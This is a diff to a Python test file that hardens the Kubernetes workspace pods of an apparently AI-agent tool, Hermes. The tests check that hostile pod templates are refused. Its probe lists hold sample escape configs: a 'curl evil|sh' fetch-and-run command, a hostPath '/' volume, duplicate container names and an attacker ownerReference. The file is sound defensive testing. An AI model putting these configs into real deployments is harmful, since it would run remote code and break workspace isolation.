@@ -209,7 +209,14 @@ def test_hard_cut_keys_are_not_in_the_schema():
     """The ~30 PodSpec-shaped keys collapsed into pod_template. No aliases, no
     shim: the schema is the 14 top-level keys the backend reasons about
     (19 leaves counting volume.* and sandbox.*)."""
-    assert len(DEFAULT_KUBERNETES_CONFIG) == 14, sorted(DEFAULT_KUBERNETES_CONFIG)
+    # Named, not counted: a bare `== 14` fails for any legitimate new key and
+    # names no offender. This fails for the same input and says which key.
+    assert set(DEFAULT_KUBERNETES_CONFIG) == {
+        "provisioner", "namespace", "kubeconfig", "context", "image",
+        "container_name", "mount_path", "pod_template", "persistent", "volume",
+        "active_deadline_seconds", "ready_timeout_seconds", "owner_reference",
+        "sandbox",
+    }, sorted(DEFAULT_KUBERNETES_CONFIG)
     gone = {
         "image_pull_policy", "image_pull_secrets", "service_account",
         "automount_service_account_token", "runtime_class_name",
@@ -494,13 +501,25 @@ def test_ensure_persistent_creates_pvc_then_pod():
         assert call.call_args.kwargs["field_validation"] == "Strict"
 
 
-def _hermes_pvc(labels=None):
-    """A PVC as the API returns it, carrying the labels pvc_manifest stamps."""
+def _hermes_pvc(labels=None, annotations=None, task="mytask", instance=None):
+    """A PVC as the API returns it, carrying the stamp pvc_manifest writes."""
+    from tools.environments.kubernetes import PVC_INSTANCE_ANNOTATION
+
+    default_labels = {
+        "app.kubernetes.io/managed-by": "hermes-agent",
+        "app.kubernetes.io/component": "hermes-workspace",
+        "hermes.nousresearch.com/task": task,
+    }
+    if instance is None:
+        instance = PodProvisioner(
+            _kcfg(), "hermes", api=None, owner_reference=OWNER_REF
+        )._instance
     return SimpleNamespace(
         metadata=SimpleNamespace(
             name="hermes-ws-mytask",
-            labels={"app.kubernetes.io/managed-by": "hermes-agent"}
-            if labels is None else labels,
+            labels=default_labels if labels is None else labels,
+            annotations={PVC_INSTANCE_ANNOTATION: instance}
+            if annotations is None else annotations,
         )
     )
 
@@ -1796,10 +1815,32 @@ def test_a_root_uid_request_is_caught_offline():
     assert validate_kubernetes_config(
         _kcfg(pod_template={"spec": {"securityContext": {"runAsUser": 1000}}})
     ) == []
-    # ...and an explicit runAsNonRoot: false is a hardening question, not a
-    # kubelet-rejection question: the judge owns that one.
+    # ...and runAsNonRoot: false on the CONTAINER really does clear it: that is
+    # the scope the kubelet reads, so the pod is accepted.
     assert validate_kubernetes_config(_kcfg(pod_template={"spec": {
-        "securityContext": {"runAsUser": 0, "runAsNonRoot": False}}})) == []
+        "containers": [{"name": "workspace", "securityContext": {
+            "runAsUser": 0, "runAsNonRoot": False}}]}})) == []
+
+
+def test_the_effective_root_uid_pair_is_what_the_kubelet_rejects():
+    """Per-SCOPE checking missed the most natural "run this session as root"
+    config there is. `spec.securityContext: {runAsNonRoot: false, runAsUser: 0}`
+    skipped the pod branch (that scope's own runAsNonRoot IS false) and skipped
+    the container branch (that scope has no runAsUser) — while the kubelet pairs
+    the container's runAsNonRoot: true, which the hardened base pins, with the
+    uid 0 it inherits from the pod, and refuses the pod with
+    CreateContainerConfigError. The check has to evaluate the EFFECTIVE pair the
+    kubelet computes, one half from each scope."""
+    problems = validate_kubernetes_config(_kcfg(pod_template={"spec": {
+        "securityContext": {"runAsNonRoot": False, "runAsUser": 0}}}))
+    assert any("runAsUser=0" in p and "runAsNonRoot" in p for p in problems), problems
+
+    # The judge still owns the hardening half of the same config, unchanged.
+    from tools.environments.kubernetes import unhardened_reasons
+
+    assert any("runAsNonRoot" in r for r in unhardened_reasons(_kcfg(
+        pod_template={"spec": {
+            "securityContext": {"runAsNonRoot": False, "runAsUser": 0}}})))
 
 
 def test_a_malformed_pod_template_is_rejected_not_discarded():
@@ -2697,3 +2738,474 @@ def test_doctor_reports_an_unrenderable_pod_template_as_a_failure():
         "hermes", MagicMock(), False, issues,
     )
     assert any("pod_template" in issue for issue in issues), issues
+
+
+# ---------------------------------------------------------------------------
+# The reserved core is a property of the SUBMITTED artifact
+# ---------------------------------------------------------------------------
+#
+# Round 4 found the fourth way into the same protection (two containers entries
+# named `workspace`: the input-side check read the first, the merge applied the
+# second, and the merge collapsed them so the API server saw no duplicate). The
+# first three were closed by naming the shape that had just been found. These
+# tests are written the other way round, as a contract on the OUTPUT — "no
+# pod_template can change the exec container's process" — so a new input shape
+# that reaches those fields fails them without anyone having thought of it.
+
+
+def _exec_contract(template):
+    """The reserved core, read off a rendered/submitted pod template."""
+    spec = template["spec"]
+    containers = [c for c in spec.get("containers") or []
+                  if isinstance(c, dict) and c.get("name") == "workspace"]
+    assert len(containers) == 1, containers
+    container = containers[0]
+    return {
+        "managed_by": template.get("metadata", {}).get("labels", {}).get(MANAGED_BY),
+        "restartPolicy": spec.get("restartPolicy"),
+        "command": container.get("command"),
+        "args": container.get("args"),
+        "workspace_mount": [m for m in container.get("volumeMounts") or []
+                            if m.get("mountPath") == "/workspace"],
+        "workspace_volume": [v for v in spec.get("volumes") or []
+                             if v.get("name") == "workspace"],
+    }
+
+
+def _submitted_templates(kcfg):
+    """What each provisioner would actually POST, as pod templates."""
+    pod = PodProvisioner(
+        kcfg, "hermes", api=None, owner_reference=OWNER_REF,
+    ).pod_manifest("abc", persistent=False, image="i:1", resources=Resources())
+    sandbox = _sandbox_cls()(
+        dict(kcfg, provisioner="sandbox"), "hermes", api=None,
+        owner_reference=OWNER_REF, custom_api=None,
+    ).sandbox_manifest("abc", persistent=False, image="i:1",
+                       resources=Resources())
+    return [
+        {"metadata": pod["metadata"], "spec": pod["spec"]},
+        sandbox["spec"]["podTemplate"],
+    ]
+
+
+#: Templates that AIM at the reserved core, by every route we can think of —
+#: and the point of the contract below is that the list does not have to be
+#: complete for the guarantee to hold.
+_CORE_PROBES = [
+    # The plain form.
+    {"spec": {"containers": [{"name": "workspace", "command": ["curl", "evil"]}]}},
+    # Round 4: a second entry under the same name. Never judged (the lookup
+    # returns the first), fully applied (the merge folds every match into the
+    # base entry), and invisible to the API server (one container comes out).
+    {"spec": {"containers": [
+        {"name": "workspace"},
+        {"name": "workspace", "command": ["/bin/sh", "-c", "curl evil|sh"],
+         "args": ["x"],
+         "volumeMounts": [{"mountPath": "/workspace", "name": "tmp"}]},
+    ]}},
+    # ...and the same idea spread over three entries, in case one lookup is
+    # ever taught about "the last one" instead of "the first one".
+    {"spec": {"containers": [
+        {"name": "workspace"},
+        {"name": "workspace", "args": ["--boom"]},
+        {"name": "workspace"},
+    ]}},
+    # The workspace mount, repointed at another volume.
+    {"spec": {"containers": [{"name": "workspace", "volumeMounts": [
+        {"name": "tmp", "mountPath": "/workspace"}]}]}},
+    # The workspace volume itself.
+    {"spec": {"volumes": [{"name": "workspace", "hostPath": {"path": "/"}}]}},
+    {"spec": {"volumes": [{"name": "workspace", "emptyDir": {}},
+                          {"name": "workspace", "hostPath": {"path": "/"}}]}},
+    # The exec container's NAME, claimed by another list. Kubernetes requires
+    # names to be unique across all three, and exec_container() resolves the
+    # session's process by that name against the running pod.
+    {"spec": {"initContainers": [{"name": "workspace", "image": "busybox"}]}},
+    {"spec": {"restartPolicy": "Always"}},
+    {"metadata": {"labels": {MANAGED_BY: "Helm"}}},
+    {"metadata": {"ownerReferences": [{"uid": "attacker"}]}},
+]
+
+#: Templates that must keep working: the reserved core is a handful of fields,
+#: not "pod_template is read-only".
+_CLEAN_PROBES = [
+    {},
+    {"spec": {"runtimeClassName": "kata"}},
+    {"spec": {"containers": [{"name": "workspace"},
+                             {"name": "sidecar", "image": "envoy"}]}},
+    {"spec": {"containers": [{"name": "workspace", "env": [
+        {"name": "A", "value": "1"}]}]}},
+    {"spec": {"volumes": [{"name": "cache", "emptyDir": {}}],
+              "containers": [{"name": "workspace", "volumeMounts": [
+                  {"name": "cache", "mountPath": "/cache"}]}]}},
+    {"metadata": {"labels": {"team": "hermes"}}},
+]
+
+
+@pytest.mark.parametrize("pod_template", _CORE_PROBES + _CLEAN_PROBES)
+def test_no_pod_template_can_change_the_exec_containers_contract(pod_template):
+    """THE contract, stated on the artifact rather than on the input.
+
+    For ANY pod_template, one of exactly two things is true:
+
+      * the config is refused — by the validator, by the renderer, and by both
+        provisioners' manifest builders — and the judge fails closed, so nothing
+        is submitted and the approval guards stay on; or
+      * it renders, and the pod both provisioners POST still carries Hermes'
+        exec contract byte for byte: the managed-by label, restartPolicy: Never,
+        exactly one `workspace` container running `sleep infinity` with no args,
+        the workspace mount at mount_path, and the workspace volume.
+
+    There is no third outcome in which a template is accepted and the submitted
+    pod differs — which is what "duplicate the container name" bought at HEAD.
+    """
+    from tools.environments.kubernetes import unhardened_reasons
+    from tools.terminal_tool import _kubernetes_has_host_access
+
+    kcfg = _kcfg(pod_template=pod_template)
+    problems = validate_kubernetes_config(kcfg)
+    if problems:
+        with pytest.raises(ValueError):
+            render_pod_template(kcfg, persistent=False, image="i:1",
+                                resources=Resources(), pvc_name="pvc")
+        with pytest.raises(ValueError):
+            _submitted_templates(kcfg)
+        # Fail closed: an unvalidated violating config must not earn the skip.
+        assert unhardened_reasons(kcfg)
+        assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True
+        return
+
+    reference = _exec_contract(render_pod_template(
+        _kcfg(), persistent=False, image="i:1", resources=Resources(),
+        pvc_name="pvc",
+    ))
+    for submitted in _submitted_templates(kcfg):
+        assert _exec_contract(submitted) == reference, submitted
+
+
+def test_every_core_probe_is_actually_refused():
+    """Guards the test above against becoming vacuous: each hostile probe must
+    take the REFUSED branch, not the "renders cleanly" one."""
+    for pod_template in _CORE_PROBES:
+        assert validate_kubernetes_config(_kcfg(pod_template=pod_template)), (
+            pod_template
+        )
+    for pod_template in _CLEAN_PROBES:
+        assert validate_kubernetes_config(_kcfg(pod_template=pod_template)) == [], (
+            pod_template
+        )
+
+
+def test_the_reserved_core_is_judged_on_the_rendered_template():
+    """The enforcement point takes (base, rendered) and compares them, so it
+    does not depend on knowing which input shape produced the difference. Handed
+    a rendered template that a hypothetical future merge quirk had tampered
+    with, it still reports every reserved field."""
+    from tools.environments.kubernetes import (
+        _hardened_base,
+        rendered_reserved_violations,
+    )
+
+    kcfg = _kcfg()
+    base = _hardened_base(kcfg, persistent=False, image="i:1",
+                          resources=Resources(), pvc_name="pvc")
+    assert rendered_reserved_violations(
+        base, base, container_name="workspace", mount_path="/workspace"
+    ) == []
+
+    tampered = json.loads(json.dumps(base))
+    container = tampered["spec"]["containers"][0]
+    container["command"] = ["curl", "evil"]
+    container["args"] = ["x"]
+    container["volumeMounts"][0] = {"name": "tmp", "mountPath": "/workspace"}
+    tampered["spec"]["restartPolicy"] = "Always"
+    tampered["spec"]["volumes"][0] = {"name": "workspace",
+                                      "hostPath": {"path": "/"}}
+    tampered["metadata"]["labels"][MANAGED_BY] = "Helm"
+    tampered["metadata"]["ownerReferences"] = [{"uid": "attacker"}]
+    problems = rendered_reserved_violations(
+        base, tampered, container_name="workspace", mount_path="/workspace"
+    )
+    for expected in ("command", "args", "volumeMounts[mountPath=/workspace]",
+                     "restartPolicy", "volumes[name=workspace]",
+                     "metadata.labels", "ownerReferences"):
+        assert any(expected in p for p in problems), (expected, problems)
+
+    # A second container with the reserved name is not a merge question at all
+    # at this layer: the artifact declares two, which is invalid, so it is
+    # refused whether or not anything folded them together.
+    doubled = json.loads(json.dumps(base))
+    doubled["spec"]["containers"].append({"name": "workspace"})
+    assert any("2 containers named" in p for p in rendered_reserved_violations(
+        doubled, doubled, container_name="workspace", mount_path="/workspace"))
+
+
+@pytest.mark.parametrize("pod_template, expected", [
+    ({"spec": {"containers": [{"name": "workspace"}, {"name": "workspace"}]}},
+     "spec.containers declares 2 entries with name='workspace'"),
+    ({"spec": {"containers": [{"name": "a"}, {"name": "a"},
+                              {"name": "workspace"}]}},
+     "spec.containers declares 2 entries with name='a'"),
+    ({"spec": {"initContainers": [{"name": "i"}, {"name": "i"}]}},
+     "spec.initContainers declares 2 entries with name='i'"),
+    ({"spec": {"volumes": [{"name": "v", "emptyDir": {}},
+                           {"name": "v", "emptyDir": {}}]}},
+     "spec.volumes declares 2 entries with name='v'"),
+    ({"spec": {"imagePullSecrets": [{"name": "s"}, {"name": "s"}]}},
+     "spec.imagePullSecrets declares 2 entries with name='s'"),
+    ({"spec": {"containers": [{"name": "workspace", "env": [
+        {"name": "A", "value": "1"}, {"name": "A", "value": "2"}]}]}},
+     "spec.containers[].env declares 2 entries with name='A'"),
+    ({"spec": {"containers": [{"name": "workspace", "volumeMounts": [
+        {"name": "a", "mountPath": "/x"}, {"name": "b", "mountPath": "/x"}]}]}},
+     "spec.containers[].volumeMounts declares 2 entries with mountPath='/x'"),
+    ({"spec": {"containers": [{"name": "workspace", "ports": [
+        {"containerPort": 80}, {"containerPort": 80}]}]}},
+     "spec.containers[].ports declares 2 entries with containerPort=80"),
+])
+def test_duplicate_keys_in_a_keyed_list_are_rejected(pod_template, expected):
+    """Defence in depth behind the rendered-artifact check, not a replacement
+    for it. Kubernetes forbids duplicates in every one of these lists; the
+    Hermes merge is what HID them, folding each duplicate into one entry — so
+    the second entry took effect without ever being read as a second entry."""
+    problems = validate_kubernetes_config(_kcfg(pod_template=pod_template))
+    assert any(expected in p for p in problems), problems
+    with pytest.raises(ValueError):
+        render_pod_template(_kcfg(pod_template=pod_template), persistent=False,
+                            image="i:1", resources=Resources(), pvc_name="pvc")
+
+
+def test_duplicate_rejection_does_not_flag_distinct_entries():
+    assert validate_kubernetes_config(_kcfg(pod_template={"spec": {
+        "containers": [
+            {"name": "workspace", "env": [{"name": "A", "value": "1"},
+                                          {"name": "B", "value": "2"}],
+             "ports": [{"containerPort": 80}, {"containerPort": 443}]},
+            {"name": "sidecar"},
+        ],
+        "volumes": [{"name": "a", "emptyDir": {}}, {"name": "b", "emptyDir": {}}],
+    }})) == []
+
+
+def test_nulling_a_hardened_default_is_visible_to_the_judge():
+    """The merge faithfully applies an explicit null, so
+    `securityContext.seccompProfile: null` DELETES the base's RuntimeDefault and
+    submits a pod with no seccomp floor. The judge read the value only when it
+    was present, so the deletion was the one relaxation it could not see — and
+    the pod kept the approval skip."""
+    from tools.environments.kubernetes import unhardened_reasons
+    from tools.terminal_tool import _kubernetes_has_host_access
+
+    kcfg = _kcfg(pod_template={"spec": {"securityContext": {
+        "seccompProfile": None}}})
+    reasons = unhardened_reasons(kcfg)
+    assert any("seccompProfile" in r for r in reasons), reasons
+    assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True
+    # ...and the null really is submitted, so this is not a theoretical worry.
+    template = render_pod_template(kcfg, persistent=False, image="i:1",
+                                   resources=Resources(), pvc_name="pvc")
+    assert template["spec"]["securityContext"]["seccompProfile"] is None
+    # The default still earns the skip.
+    assert unhardened_reasons(_kcfg()) == []
+
+
+def test_pod_annotations_are_judged():
+    """metadata.annotations is copied verbatim into the submitted template. The
+    deprecated AppArmor annotation is a metadata KEY, so the appArmorProfile
+    securityContext check never sees it, and the Kata family reconfigures the
+    very VM the Kata runtime is being deployed for."""
+    from tools.environments.kubernetes import unhardened_reasons
+    from tools.terminal_tool import _kubernetes_has_host_access
+
+    kcfg = _kcfg(pod_template={"metadata": {"annotations": {
+        "container.apparmor.security.beta.kubernetes.io/workspace": "unconfined",
+        "io.katacontainers.config.hypervisor.enable_iommu": "true",
+    }}})
+    reasons = unhardened_reasons(kcfg)
+    assert any("apparmor" in r for r in reasons), reasons
+    assert any("katacontainers" in r for r in reasons), reasons
+    assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True
+    # An ordinary annotation is not noise.
+    assert unhardened_reasons(_kcfg(pod_template={"metadata": {
+        "annotations": {"team": "hermes"}}})) == []
+
+
+@pytest.mark.parametrize("overrides, expected", [
+    ({"sandbox": "oops"}, "terminal.kubernetes.sandbox must be a mapping"),
+    ({"volume": "oops"}, "terminal.kubernetes.volume must be a mapping"),
+    ({"provisioner": "sandbox", "sandbox": {"spec": "oops"}},
+     "terminal.kubernetes.sandbox.spec must be a mapping"),
+])
+def test_a_non_mapping_block_is_a_message_not_a_crash(overrides, expected):
+    """The validator's whole job is turning this into a sentence. It indexed
+    `(kcfg.get("volume") or {}).get(...)` instead, so a scalar there made the
+    validator itself raise AttributeError, and a scalar sandbox.spec was
+    invisible to validator and judge alike before dying as a bare TypeError
+    inside the CR builder."""
+    kcfg = _kcfg(**overrides)
+    problems = validate_kubernetes_config(kcfg)
+    assert any(expected in p for p in problems), problems
+
+
+def test_a_non_mapping_sandbox_spec_is_not_hardened_and_is_not_posted():
+    from tools.environments.kubernetes import unhardened_reasons
+    from tools.terminal_tool import _kubernetes_has_host_access
+
+    kcfg = _kcfg(provisioner="sandbox", sandbox={"spec": "oops"})
+    assert any("sandbox.spec" in r for r in unhardened_reasons(kcfg))
+    assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True
+    with pytest.raises(ValueError, match="sandbox.spec"):
+        _sandbox_cls()(
+            kcfg, "hermes", api=None, owner_reference=OWNER_REF, custom_api=None,
+        ).sandbox_manifest("abc", persistent=False, image="i:1",
+                           resources=Resources())
+
+
+def test_a_reviewed_sandbox_key_is_reviewed_in_ITS_SHAPE_only():
+    """`ttlSeconds` is exempt because a TTL can only SHORTEN the workspace's
+    life — a claim about an integer, not about a name. Allowlisting the name
+    whatever it holds let an arbitrary object ride into the submitted CR
+    unjudged."""
+    from tools.environments.kubernetes import unhardened_reasons
+
+    assert unhardened_reasons(_sandbox_kcfg(spec={"ttlSeconds": 600})) == []
+    for bad in ({"sandboxTemplateRef": {"name": "evil"}}, "600", True):
+        reasons = unhardened_reasons(_sandbox_kcfg(spec={"ttlSeconds": bad}))
+        assert any("ttlSeconds" in r for r in reasons), (bad, reasons)
+
+
+# ---------------------------------------------------------------------------
+# Refusing to adopt is refusing to delete
+# ---------------------------------------------------------------------------
+
+
+def test_refusing_to_adopt_a_foreign_pod_does_not_delete_it():
+    """The read side was guarded and the write side was not: ensure() raised
+    "not created by this Hermes instance", KubernetesEnvironment.__init__ caught
+    it and ran its cleanup path, which rebuilds the SAME conventional name and
+    deletes it. The refusal has to bind both directions."""
+    from kubernetes.client.exceptions import ApiException
+
+    api = MagicMock()
+    api.create_namespaced_pod.side_effect = ApiException(status=409)
+    api.read_namespaced_pod.return_value = _running_pod(
+        labels={MANAGED_BY: "hermes-agent"},
+        owners=[SimpleNamespace(uid="SOMEONE-ELSE")],
+    )
+    provisioner = _provisioner_with_api(api)
+
+    # Driven through the real environment constructor, which is where the
+    # cleanup path lives.
+    with pytest.raises(RuntimeError, match="not created by this Hermes instance"):
+        KubernetesEnvironment(
+            provisioner=provisioner, task_id="abc", persistent=False,
+            image="i:1", api=api, sync_files=False,
+        )
+    api.delete_namespaced_pod.assert_not_called()
+
+
+def test_an_unreadable_pod_is_not_deleted_either():
+    """`except ApiException: return False` turned a 403 on `get pods` (or any
+    transient API error) into "not ours" — and the cleanup path then deleted the
+    agent's own live persistent workspace. Unreadable is its own answer, and it
+    fails closed in BOTH directions."""
+    from kubernetes.client.exceptions import ApiException
+
+    api = MagicMock()
+    api.create_namespaced_pod.side_effect = ApiException(status=409)
+    api.read_namespaced_pod.side_effect = ApiException(status=403, reason="Forbidden")
+    p = _provisioner_with_api(api)
+
+    with pytest.raises(RuntimeError, match="ownership could not be read"):
+        p.ensure("abc", persistent=False, image="i:1", resources=Resources())
+    p.destroy(PodRef("hermes", p.workspace_name("abc"), "workspace"),
+              persistent=False)
+    api.delete_namespaced_pod.assert_not_called()
+
+
+def test_refusing_to_adopt_a_foreign_sandbox_does_not_delete_it():
+    """Same shape on the CR path, plus its own extra: destroy() fell back to
+    `[pod_ref.pod_name]` precisely when _created_names was empty, which is
+    exactly the state _assert_ours leaves behind when it refuses."""
+    from kubernetes.client.exceptions import ApiException
+
+    custom = MagicMock()
+    custom.create_namespaced_custom_object.side_effect = ApiException(status=409)
+    custom.get_namespaced_custom_object.return_value = {
+        "metadata": {"uid": "sb", "ownerReferences": [{"uid": "SOMEONE-ELSE"}]},
+    }
+    api = MagicMock()
+    p = _sandbox_provisioner(api=api, custom=custom)
+
+    with pytest.raises(RuntimeError) as excinfo:
+        p.ensure("abc", persistent=False, image="i:1", resources=Resources())
+    assert "not created by this Hermes instance" in str(excinfo.value)
+    # ...and it is called a sandbox, not a "sandboxe".
+    assert "sandboxe " not in str(excinfo.value)
+
+    p.destroy(PodRef("hermes", p.workspace_name("abc"), "workspace"),
+              persistent=False)
+    custom.delete_namespaced_custom_object.assert_not_called()
+
+
+def test_pvc_adoption_requires_the_whole_hermes_provenance_stamp():
+    """The claim is mounted at the agent's cwd and the session-start sync writes
+    credential files into it, and its name is deliberately predictable
+    (`hermes-ws-<task>`, task ids collapse to "default"). Accepting anything
+    that carries ONE well-known label meant anything able to create a labelled
+    PVC in the namespace could pre-create the claim and be handed those files.
+
+    What is checkable here is provenance, not identity — the claim carries no
+    ownerReference by design — so the whole stamp is required and a missing one
+    fails closed."""
+    from kubernetes.client.exceptions import ApiException
+    from tools.environments.kubernetes import PVC_INSTANCE_ANNOTATION
+
+    def _refuses(pvc, match):
+        api = MagicMock()
+        api.read_namespaced_persistent_volume_claim.return_value = pvc
+        p = _provisioner_with_api(api)
+        with pytest.raises(RuntimeError, match=match):
+            p.ensure("mytask", persistent=True, image="i:1", resources=Resources())
+        api.create_namespaced_pod.assert_not_called()
+
+    # No Hermes labels at all (round-2 case, still refused).
+    _refuses(_hermes_pvc(labels={"owner": "someone-else"}), "not a Hermes workspace")
+    # The managed-by label alone — the shape anything with PVC create can make.
+    _refuses(_hermes_pvc(labels={MANAGED_BY: "hermes-agent"}, annotations={}),
+             "component label")
+    # Right labels, but for another task's workspace.
+    _refuses(_hermes_pvc(task="someone-elses-task"), "labelled for task")
+    # Everything but the provenance stamp: no Hermes agent recorded creating it.
+    _refuses(_hermes_pvc(annotations={}), "carries no")
+
+    # A claim Hermes itself created is adopted, and the stamp is what it writes.
+    api = MagicMock()
+    api.read_namespaced_persistent_volume_claim.return_value = _hermes_pvc()
+    api.read_namespaced_pod.return_value = _running_pod()
+    p = _provisioner_with_api(api)
+    p.ensure("mytask", persistent=True, image="i:1", resources=Resources())
+    api.create_namespaced_persistent_volume_claim.assert_not_called()
+
+    api.read_namespaced_persistent_volume_claim.side_effect = ApiException(status=404)
+    p.ensure("mytask", persistent=True, image="i:1", resources=Resources())
+    body = api.create_namespaced_persistent_volume_claim.call_args.kwargs["body"]
+    assert body["metadata"]["annotations"][PVC_INSTANCE_ANNOTATION] == p._instance
+
+
+def test_pvc_adoption_across_instances_stays_possible_but_is_logged(caplog):
+    """Two agents running the same task id SHARE the claim by design (the name
+    is task-scoped so a persistent workspace resumes after the agent pod is
+    replaced). That must keep working — and must never be silent, because the
+    agent's credential files are synced into someone else's workspace."""
+    api = MagicMock()
+    api.read_namespaced_persistent_volume_claim.return_value = _hermes_pvc(
+        instance="another0"
+    )
+    api.read_namespaced_pod.return_value = _running_pod()
+    p = _provisioner_with_api(api)
+    with caplog.at_level("WARNING"):
+        p.ensure("mytask", persistent=True, image="i:1", resources=Resources())
+    assert any("another0" in record.getMessage() for record in caplog.records), (
+        caplog.records
+    )
